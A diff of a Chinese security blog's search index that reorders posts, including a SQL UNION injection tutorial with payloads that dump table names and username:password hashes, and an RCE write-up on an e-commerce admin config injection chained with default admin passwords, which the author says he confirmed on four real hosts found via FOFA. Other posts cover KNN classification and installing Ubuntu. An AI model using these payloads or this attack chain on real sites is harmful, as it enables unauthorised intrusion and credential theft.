@@ -1,66 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>SQL联合查询注入</title>
-    <url>/2025/08/06/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>平时在浏览网页时会注意到有这种网址</p>
-<p><strong>GET请求类型</strong></p>
-<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a><br><a href="http://example.com/profile?user=admin">http://example.com/profile?user=admin</a></p>
-<p><strong>POST请求类型</strong></p>
-<p>username: admin<br>password: anything</p>
-<p>等等这个样子的都在与数据库产生信息传递</p>
-<p>以比较简单的GET请求来说</p>
-<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘</p>
-<p>假设这个网站是一个通过学号查询个人信息的程序，这个id处输入学号然后返回该学号的一些个人信息</p>
-<p>这个news.php种必定有</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, username, email FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>代码第一行从url的id参数获取值（学号）存储到id这个变量<br>代码第二行将id变量拼接到SQL语句中查询users表中匹配的id并返回相关的id username email 从users表中</p>
-<p>此时如果我们<a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘</p>
-<p>此时这个SQL代码就是</p>
-<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’’ LIMIT 1</p>
-<p>必定会返回一个报错，那就证明这个位置存在SQL注入漏洞，因为并没有过滤’</p>
-<p>我们第一步肯定是要获取它这个表中有几个列<a href="http://example.com/news.php?id=%271">http://example.com/news.php?id=&#39;1</a>‘ ORDER BY 1–+ ‘ LIMIT 1</p>
-<p>此时这个SQL代码就是</p>
-<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’ LIMIT 1</p>
-<p>有些人估计会发现和自己想的不一样，不应该是<br>SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’LIMIT 1吗</p>
-<p>其实是因为第二个’ 已经将第一个’闭合掉了 然后–注释掉’ LIMIT 1<br>这样才可以执行ORDER by 1</p>
-<p>接下来先了解一下这个ORDER by是什么东东</p>
-<p>ORDER BY是 SQL 语言中的一个关键子句，主要用于对查询结果进行排序</p>
-<p>比如ORDER by 3 会对email进行一个查排序</p>
-<p>如果将3换成4，会返回报错，因为它没有4这个列数，因此就可以通过这个机制判断这个表有几列</p>
-<p>可以不断增加这个查询的数直到报错，那这个表的列数就为查询的数-1</p>
-<p>前面这些都是比较基础的，都是为本文的重点联合查询注入作铺垫</p>
-<p><a href="http://example.com/news.phpid=1">http://example.com/news.phpid=1</a>‘ UNION SELECT 1,2,3–+</p>
-<p>此时这个SQL代码就是</p>
-<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,2,3–+’ LIMIT 1</p>
-<p>先来了解一下联合查询语句UNION SELECT</p>
-<p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果</p>
-<p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似</p>
-<p>如果页面上返回了3那么这个地方就是原本email显示的地方，知道这个以后就可以换成将这个位置换成更敏感的语句</p>
-<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,database(),version()–+</p>
-<p>此时这个SQL代码就是</p>
-<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,database(),version()–+’ LIMIT 1</p>
-<p>就可以返回</p>
-<pre><code>当前数据库名称
-
-MySQL 版本信息
-</code></pre>
-<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
-<p>这会列出当前数据库中的所有表名（通常会看到 users 表)</p>
-<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name&#x3D;’users’–+</p>
-<p>这会显示 users 表的所有列名（如 id, username, password）</p>
-<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(username,’:’,password),3 FROM users–+</p>
-<p>这会显示所有用户名和密码（通常是 MD5 哈希）</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>WEB安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>KNN猫狗分类</title>
     <url>/2025/08/03/KNN%E7%8C%AB%E7%8B%97%E5%88%86%E7%B1%BB/</url>
     <content><![CDATA[<h1 id="KNN猫狗分类"><a href="#KNN猫狗分类" class="headerlink" title="KNN猫狗分类"></a>KNN猫狗分类</h1><p>在生活中不同种类的生物，可以通过身高、体重等特征来进行简单的分类。猫和狗的分类就是一个典型的例子。</p>
@@ -144,6 +84,93 @@ MySQL 版本信息
       </tags>
   </entry>
   <entry>
+    <title>SQL联合查询注入</title>
+    <url>/2025/08/06/SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>平时在浏览网页时会注意到有这种网址</p>
+<p><strong>GET请求类型</strong></p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a><br><a href="http://example.com/profile?user=admin">http://example.com/profile?user=admin</a></p>
+<p><strong>POST请求类型</strong></p>
+<p>username: admin<br>password: anything</p>
+<p>等等这个样子的都在与数据库产生信息传递</p>
+<p>以比较简单的GET请求来说</p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘</p>
+<p>假设这个网站是一个通过学号查询个人信息的程序，这个id处输入学号然后返回该学号的一些个人信息</p>
+<p>这个news.php种必定有</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, username, email FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>代码第一行从url的id参数获取值（学号）存储到id这个变量<br>代码第二行将id变量拼接到SQL语句中查询users表中匹配的id并返回相关的id username email 从users表中</p>
+<p>此时如果我们<a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘</p>
+<p>此时这个SQL代码就是</p>
+<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’’ LIMIT 1</p>
+<p>必定会返回一个报错，那就证明这个位置存在SQL注入漏洞，因为并没有过滤’</p>
+<p>我们第一步肯定是要获取它这个表中有几个列<a href="http://example.com/news.php?id=%271">http://example.com/news.php?id=&#39;1</a>‘ ORDER BY 1–+ ‘ LIMIT 1</p>
+<p>此时这个SQL代码就是</p>
+<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’ LIMIT 1</p>
+<p>有些人估计会发现和自己想的不一样，不应该是<br>SELECT id, username, email FROM users WHERE id&#x3D;’1’ ORDER by 1–+’LIMIT 1吗</p>
+<p>其实是因为第二个’ 已经将第一个’闭合掉了 然后–注释掉’ LIMIT 1<br>这样才可以执行ORDER by 1</p>
+<p>接下来先了解一下这个ORDER by是什么东东</p>
+<p>ORDER BY是 SQL 语言中的一个关键子句，主要用于对查询结果进行排序</p>
+<p>比如ORDER by 3 会对email进行一个查排序</p>
+<p>如果将3换成4，会返回报错，因为它没有4这个列数，因此就可以通过这个机制判断这个表有几列</p>
+<p>可以不断增加这个查询的数直到报错，那这个表的列数就为查询的数-1</p>
+<p>前面这些都是比较基础的，都是为本文的重点联合查询注入作铺垫</p>
+<p><a href="http://example.com/news.phpid=1">http://example.com/news.phpid=1</a>‘ UNION SELECT 1,2,3–+</p>
+<p>此时这个SQL代码就是</p>
+<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,2,3–+’ LIMIT 1</p>
+<p>先来了解一下联合查询语句UNION SELECT</p>
+<p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果</p>
+<p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。它可以从多个表中选择数据，并将结果集组合成一个结果集。使用 UNION 时，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似</p>
+<p>如果页面上返回了3那么这个地方就是原本email显示的地方，知道这个以后就可以换成将这个位置换成更敏感的语句</p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,database(),version()–+</p>
+<p>此时这个SQL代码就是</p>
+<p>SELECT id, username, email FROM users WHERE id&#x3D;’1’ UNION SELECT 1,database(),version()–+’ LIMIT 1</p>
+<p>就可以返回</p>
+<pre><code>当前数据库名称
+
+MySQL 版本信息
+</code></pre>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
+<p>这会列出当前数据库中的所有表名（通常会看到 users 表)</p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name&#x3D;’users’–+</p>
+<p>这会显示 users 表的所有列名（如 id, username, password）</p>
+<p><a href="http://example.com/news.php?id=1">http://example.com/news.php?id=1</a>‘ UNION SELECT 1,group_concat(username,’:’,password),3 FROM users–+</p>
+<p>这会显示所有用户名和密码（通常是 MD5 哈希）</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>电商平台后台RCE漏洞分析：从弱口令到0day利用</title>
+    <url>/2025/09/06/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<p>近日，朋友发现某电商平台存在一个高危漏洞，将数据包发给我进行审计。首先使用Seay源代码审计系统对代码包进行自动化扫描，系统报告了300+个潜在漏洞点，我将结果丢给AI，从中筛选出1个最可能被利用的高危远程代码漏洞。</p>
+<h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p><code>app/common/logic/admin/config.php</code>文件中的配置写入功能存在代码注入漏洞。</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="string">&quot;return [</span></span><br><span class="line"><span class="string">    &#x27;url&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;m_url&#x27;</span>] . <span class="string">&quot;&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;title&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;map_key&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;map_key&#x27;</span>] . <span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">]&quot;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php\n &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">config_path</span>() . <span class="string">&quot;site.php&quot;</span>, <span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+<p>漏洞原理</p>
+<p>该段代码直接将用户输入的参数（$param[‘title’]等）拼接至PHP配置文件中，未做任何过滤处理。攻击者可以通过注入PHP代码，实现远程代码执行。<br>漏洞复现</p>
+<p>在后台修改网站标题处输入：.phpinfo().</p>
+<p>系统生成的配置文件内容变为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span> =&gt; <span class="string">&#x27;http://example.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">phpinfo</span>().<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;map_key&#x27;</span> =&gt; <span class="string">&#x27;key_value&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;config&#x2F;site.php文件即可触发phpinfo()执行。</p>
+<p>但该漏洞需要后台权限才能利用，我发现管理员后台账号密码默认为admin。</p>
+<p>在FOFA找到百个资产，测试了10个有4个存在弱口令，RCE也验证成功。</p>
+<p>因此攻击链可完整形成：</p>
+<p>弱口令进入后台 → 利用RCE漏洞获取服务器权限</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>WEB安全</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>edusrc账号信息收集</title>
     <url>/2026/02/04/edusrc%E8%B4%A6%E5%8F%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<h2 id="⚠️-安全声明"><a href="#⚠️-安全声明" class="headerlink" title="⚠️ 安全声明"></a>⚠️ 安全声明</h2><p>本文章未经许可严禁转载。文中内容仅限交流学习，严禁用于商业及非法用途，未经授权的渗透行为皆为违法行为，违规使用后果自负，与本作者无关。</p>
@@ -175,33 +202,6 @@ MySQL 版本信息
         <tag>edusrc</tag>
         <tag>src</tag>
         <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>电商平台后台RCE漏洞分析：从弱口令到0day利用</title>
-    <url>/2025/09/06/%E7%94%B5%E5%95%86%E5%B9%B3%E5%8F%B0%E5%90%8E%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%8E%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%88%B00day%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<p>近日，朋友发现某电商平台存在一个高危漏洞，将数据包发给我进行审计。首先使用Seay源代码审计系统对代码包进行自动化扫描，系统报告了300+个潜在漏洞点，我将结果丢给AI，从中筛选出1个最可能被利用的高危远程代码漏洞。</p>
-<h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p><code>app/common/logic/admin/config.php</code>文件中的配置写入功能存在代码注入漏洞。</p>
-<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="string">&quot;return [</span></span><br><span class="line"><span class="string">    &#x27;url&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;m_url&#x27;</span>] . <span class="string">&quot;&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;title&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;map_key&#x27; =&gt; &#x27;&quot;</span> . <span class="variable">$param</span>[<span class="string">&#x27;map_key&#x27;</span>] . <span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string">]&quot;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php\n &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">config_path</span>() . <span class="string">&quot;site.php&quot;</span>, <span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
-
-<p>漏洞原理</p>
-<p>该段代码直接将用户输入的参数（$param[‘title’]等）拼接至PHP配置文件中，未做任何过滤处理。攻击者可以通过注入PHP代码，实现远程代码执行。<br>漏洞复现</p>
-<p>在后台修改网站标题处输入：.phpinfo().</p>
-<p>系统生成的配置文件内容变为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span> =&gt; <span class="string">&#x27;http://example.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">phpinfo</span>().<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;map_key&#x27;</span> =&gt; <span class="string">&#x27;key_value&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
-
-<p>访问&#x2F;config&#x2F;site.php文件即可触发phpinfo()执行。</p>
-<p>但该漏洞需要后台权限才能利用，我发现管理员后台账号密码默认为admin。</p>
-<p>在FOFA找到百个资产，测试了10个有4个存在弱口令，RCE也验证成功。</p>
-<p>因此攻击链可完整形成：</p>
-<p>弱口令进入后台 → 利用RCE漏洞获取服务器权限</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>WEB安全</tag>
-        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
@@ -270,37 +270,6 @@ MySQL 版本信息
       </tags>
   </entry>
   <entry>
-    <title>记录一次从Windows安装Linux（Ubuntu）的全过程</title>
-    <url>/2025/10/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="系统更换原因"><a href="#系统更换原因" class="headerlink" title="系统更换原因"></a>系统更换原因</h2><p>由于我的这台电脑是我哥的到现在已经6年了，用的是越来越卡这个windows系统有时一直卡死导致只能重启，这个真的是特别麻烦。</p>
-<p>还有一点就是我这个人不太喜欢删文件桌面和D盘上堆满了文件，看的很不舒服。</p>
-<p>最近我看到关于Ubuntu图形版的页面我觉得很干净的，并且占用C盘内存较少也是非常流畅的，所以我就决定装这个系统了。</p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="启动盘制作"><a href="#启动盘制作" class="headerlink" title="启动盘制作"></a>启动盘制作</h3><p>首先我从我抽屉里翻到了个落满灰尘的U盘，这个好像是我上次给我的电脑救砖时用的，现在可派上用场了可以做启动盘。</p>
-<p>现在就可以去做启动盘了，这里我推荐<a href="https://www.ventoy.net/">Ventoy</a>。</p>
-<p>启动盘工具下载好后插入U盘，然后点击安装就行了（此过程会初始化U盘，有什么重要的数据务必要备份），等这个U盘名变为Ventoy就行了。</p>
-<p>接下来去下载系统镜像，我这里下的是<a href="https://releases.ubuntu.com/22.04/ubuntu-22.04.5-desktop-amd64.iso">ubuntu-22.04.5-desktop-amd64</a>这个版本比较稳定，也可以选择其他版本。</p>
-<p>下载好后就拷贝到U盘里就行了，现在这个启动盘就搞好了。</p>
-<h3 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h3><p>现在先关机，不同笔记本进BISO的方法不一样我这里是联想笔记本在开机的时候狂按F2就进去了，以下是别的电脑进BISO的方法：</p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">联想（Lenovo）：F2 或 Fn + F2</span><br><span class="line">惠普（HP）：Esc 然后按 F10，或直接按 F10</span><br><span class="line">戴尔（Dell）：F2 或 Fn + F2</span><br><span class="line">华硕（ASUS）：Delete 或 F2</span><br><span class="line">宏碁（Acer）：F2 或 Delete</span><br><span class="line">微星（MSI）：Delete</span><br><span class="line">技嘉（Gigabyte）：Delete 或 F2</span><br><span class="line">三星（Samsung）：F2</span><br><span class="line">索尼（Sony VAIO）：F2 或 Assist 键（部分型号）</span><br></pre></td></tr></table></figure>
-
-<p>这里会有个联想的独有的intelRST问题很重要，不然在后续的系统安装会出现：</p>
-<p><img src="https://picx.zhimg.com/v2-dc3c94cdf3fdc812ad5bbed3cdf60fd7_1440w.jpg" alt="联想Intel RST问题"></p>
-<p>解决方法很简单进BISO后Main那里Ctrl+S，就会出现SATA Mode，选ACHI即可然后记得保存。</p>
-<p>之后就简单多了改启动项为U盘一般带USB的就是，然后一路回车进入Ubuntu安装页面就行了跟着指引走。</p>
-<h2 id="安装一些软件"><a href="#安装一些软件" class="headerlink" title="安装一些软件"></a>安装一些软件</h2><p>这里我会引用一些别人的文章，讲的非常详细，我当时就是根据这些文章来安装的。</p>
-<p>搜狗输入法:<a href="https://blog.csdn.net/qq_44684757/article/details/135991216">https://blog.csdn.net/qq_44684757/article/details/135991216</a><br><em>要点：注意安装依赖</em><br>QQ:<a href="https://blog.csdn.net/weixin_44629973/article/details/102871352">https://blog.csdn.net/weixin_44629973/article/details/102871352</a></p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>整体来说是比较流畅的，系统也很干净简洁没啥广告，只不过还要适应一段时间。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>Ubuntu</tag>
-        <tag>系统安装</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>重生之补天六群今日无人生还</title>
     <url>/2026/02/07/%E9%87%8D%E7%94%9F%E4%B9%8B%E8%A1%A5%E5%A4%A9%E5%85%AD%E7%BE%A4%E4%BB%8A%E6%97%A5%E6%97%A0%E4%BA%BA%E7%94%9F%E8%BF%98/</url>
     <content><![CDATA[<p>免责声明，该短篇小说基于集体语言的文字重组，如有侵权，请联系博主技术删除，如有雷同，那只能说明小说照进了现实，若感到熟悉，请不要对群入座。如有好事者自认为是主人公，请及时提供姓名，手机号，身份证号，家庭住址等个人信息，以便相关执法部门可以快速精准的追究其法律责任，小说我可以随意意淫，随意入侵，现实中你敢未授权入侵国防xx，阿xx，3xx?</p>
@@ -352,6 +321,37 @@ MySQL 版本信息
       </categories>
       <tags>
         <tag>吃瓜</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录一次从Windows安装Linux（Ubuntu）的全过程</title>
+    <url>/2025/10/07/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E4%BB%8EWindows%E5%AE%89%E8%A3%85Linux%EF%BC%88Ubuntu%EF%BC%89%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="系统更换原因"><a href="#系统更换原因" class="headerlink" title="系统更换原因"></a>系统更换原因</h2><p>由于我的这台电脑是我哥的到现在已经6年了，用的是越来越卡这个windows系统有时一直卡死导致只能重启，这个真的是特别麻烦。</p>
+<p>还有一点就是我这个人不太喜欢删文件桌面和D盘上堆满了文件，看的很不舒服。</p>
+<p>最近我看到关于Ubuntu图形版的页面我觉得很干净的，并且占用C盘内存较少也是非常流畅的，所以我就决定装这个系统了。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="启动盘制作"><a href="#启动盘制作" class="headerlink" title="启动盘制作"></a>启动盘制作</h3><p>首先我从我抽屉里翻到了个落满灰尘的U盘，这个好像是我上次给我的电脑救砖时用的，现在可派上用场了可以做启动盘。</p>
+<p>现在就可以去做启动盘了，这里我推荐<a href="https://www.ventoy.net/">Ventoy</a>。</p>
+<p>启动盘工具下载好后插入U盘，然后点击安装就行了（此过程会初始化U盘，有什么重要的数据务必要备份），等这个U盘名变为Ventoy就行了。</p>
+<p>接下来去下载系统镜像，我这里下的是<a href="https://releases.ubuntu.com/22.04/ubuntu-22.04.5-desktop-amd64.iso">ubuntu-22.04.5-desktop-amd64</a>这个版本比较稳定，也可以选择其他版本。</p>
+<p>下载好后就拷贝到U盘里就行了，现在这个启动盘就搞好了。</p>
+<h3 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h3><p>现在先关机，不同笔记本进BISO的方法不一样我这里是联想笔记本在开机的时候狂按F2就进去了，以下是别的电脑进BISO的方法：</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">联想（Lenovo）：F2 或 Fn + F2</span><br><span class="line">惠普（HP）：Esc 然后按 F10，或直接按 F10</span><br><span class="line">戴尔（Dell）：F2 或 Fn + F2</span><br><span class="line">华硕（ASUS）：Delete 或 F2</span><br><span class="line">宏碁（Acer）：F2 或 Delete</span><br><span class="line">微星（MSI）：Delete</span><br><span class="line">技嘉（Gigabyte）：Delete 或 F2</span><br><span class="line">三星（Samsung）：F2</span><br><span class="line">索尼（Sony VAIO）：F2 或 Assist 键（部分型号）</span><br></pre></td></tr></table></figure>
+
+<p>这里会有个联想的独有的intelRST问题很重要，不然在后续的系统安装会出现：</p>
+<p><img src="https://picx.zhimg.com/v2-dc3c94cdf3fdc812ad5bbed3cdf60fd7_1440w.jpg" alt="联想Intel RST问题"></p>
+<p>解决方法很简单进BISO后Main那里Ctrl+S，就会出现SATA Mode，选ACHI即可然后记得保存。</p>
+<p>之后就简单多了改启动项为U盘一般带USB的就是，然后一路回车进入Ubuntu安装页面就行了跟着指引走。</p>
+<h2 id="安装一些软件"><a href="#安装一些软件" class="headerlink" title="安装一些软件"></a>安装一些软件</h2><p>这里我会引用一些别人的文章，讲的非常详细，我当时就是根据这些文章来安装的。</p>
+<p>搜狗输入法:<a href="https://blog.csdn.net/qq_44684757/article/details/135991216">https://blog.csdn.net/qq_44684757/article/details/135991216</a><br><em>要点：注意安装依赖</em><br>QQ:<a href="https://blog.csdn.net/weixin_44629973/article/details/102871352">https://blog.csdn.net/weixin_44629973/article/details/102871352</a></p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>整体来说是比较流畅的，系统也很干净简洁没啥广告，只不过还要适应一段时间。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>Ubuntu</tag>
+        <tag>系统安装</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
 </search>
